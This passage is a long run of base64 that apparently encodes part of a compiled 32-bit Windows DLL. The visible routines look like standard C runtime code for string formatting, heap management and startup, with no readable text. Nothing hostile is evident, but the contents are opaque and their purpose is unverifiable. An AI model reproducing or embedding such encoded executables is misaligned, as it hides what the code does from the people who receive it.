QAAg8Egx4Wk+///AQAAAImN5Pv//4ON+Pv//0CDvfT7//8AjbX8+///uAACAACJtfD7//+Jhez7//8PjY0CAADHhfT7//8GAAAA6ekCAAD3hfj7//8wCAAAD4XJAAAAg434+///IOm9AAAA94X4+///MAgAAHUHg434+///IIu99Pv//4P//3UFv////3+DwwT2hfj7//8giZ3o+///i1v8iZ3w+///D4QFBQAAhdt1C6EgXQEQiYXw+///g6Xs+///AIu18Pv//4X/D44dBQAAigaEwA+EEwUAAI2NtPv//w+2wFFQ6F7L//9ZWYXAdAFGRv+F7Pv//zm97Pv//3zQ6egEAACD6FgPhPACAAArwg+ElQAAAIPoBw+E9f7//yvCD4XGBAAAD7cDg8MEM/ZG9oX4+///IIm12Pv//4md6Pv//4mFnPv//3RCiIXI+///jYW0+///UIuFtPv//8aFyfv//wD/sKwAAACNhcj7//9QjYX8+///UOicRAAAg8QQhcB9D4m1sPv//+sHZomF/Pv//42F/Pv//4mF8Pv//4m17Pv//+lCBAAAiwODwwSJnej7//+FwHQ6i0gEhcl0M/eF+Pv//wAIAAAPvwCJjfD7//90EpkrwseF2Pv//wEAAADp/QMAAIOl2Pv//wDp8wMAAKEgXQEQiYXw+///UOjoJQAAWencAwAAg/hwD4/2AQAAD4TeAQAAg/hlD4zKAwAAg/hnD47o/f//g/hpdG2D+G50JIP4bw+FrgMAAPaF+Pv//4CJteT7//90YYGN+Pv//wACAADrVYszg8MEiZ3o+///6JpDAACFwA+EVvr///aF+Pv//yB0DGaLheD7//9miQbrCIuF4Pv//4kGx4Ww+///AQAAAOnBBAAAg434+///QMeF5Pv//woAAAD3hfj7//8AgAAAD4SrAQAAA96LQ/iLU/zp5wEAAHUSZoP5Z3Vjx4X0+///AQAAAOtXOYX0+///fgaJhfT7//+BvfT7//+jAAAAfj2LvfT7//+Bx10BAABX6PEEAABZi43k+///iYWo+///hcB0EImF8Pv//4m97Pv//4vw6wrHhfT7//+jAAAAiwODwwiJhZT7//+LQ/yJhZj7//+NhbT7//9Q/7Wk+///D77B/7X0+///iZ3o+///UP+17Pv//42FlPv//1ZQ/zVAXQEQ6Kbk//9Z/9CLnfj7//+DxByB44AAAAB0IYO99Pv//wB1GI2FtPv//1BW/zVMXQEQ6Hbk//9Z/9BZWWaDveT7//9ndRyF23UYjYW0+///UFb/NUhdARDoUOT//1n/0FlZgD4tdRGBjfj7//8AAQAARom18Pv//1bpCP7//4m19Pv//8eFrPv//wcAAADrJIPocw+Eavz//yvCD4SK/v//g+gDD4XJAQAAx4Ws+///JwAAAPaF+Pv//4DHheT7//8QAAAAD4Rq/v//ajBYZomF0Pv//4uFrPv//4PAUWaJhdL7//+Jldz7///pRf7///eF+Pv//wAQAAAPhUX+//+DwwT2hfj7//8gdBz2hfj7//9AiZ3o+///dAYPv0P86wQPt0P8mesX9oX4+///QItD/HQDmesCM9KJnej7///2hfj7//9AdBuF0n8XfASFwHMR99iD0gD32oGN+Pv//wABAAD3hfj7//8AkAAAi9qL+HUCM9uDvfT7//8AfQzHhfT7//8BAAAA6xqDpfj7///3uAACAAA5hfT7//9+BomF9Pv//4vHC8N1BiGF3Pv//421+/3//4uF9Pv///+N9Pv//4XAfwaLxwvDdC2LheT7//+ZUlBTV+j3QQAAg8Ewg/k5iZ2Q+///i/iL2n4GA42s+///iA5O672Nhfv9//8rxkb3hfj7//8AAgAAiYXs+///ibXw+///dFmFwHQHi86AOTB0Tv+N8Pv//4uN8Pv//8YBMEDrNoXbdQuhJF0BEImF8Pv//4uF8Pv//8eF2Pv//wEAAADrCU9mgzgAdAYDwoX/dfMrhfD7///R+ImF7Pv//4O9sPv//wAPhWUBAACLhfj7//+oQHQrqQABAAB0BGot6w6oAXQEaivrBqgCdBRqIFhmiYXQ+///x4Xc+///AQAAAIud1Pv//4u17Pv//yveK53c+///9oX4+///DHUX/7XE+///jYXg+///U2og6Orp//+DxAz/tdz7//+LvcT7//+NheD7//+NjdD7///o8en///aF+Pv//whZdBv2hfj7//8EdRJXU2owjYXg+///6Kjp//+DxAyDvdj7//8AdXWF9n5xi73w+///ibXk+////43k+///jYW0+///UIuFtPv///+wrAAAAI2FnPv//1dQ6DY/AACDxBCJhZD7//+FwH4p/7Wc+///i4XE+///jbXg+///6BPp/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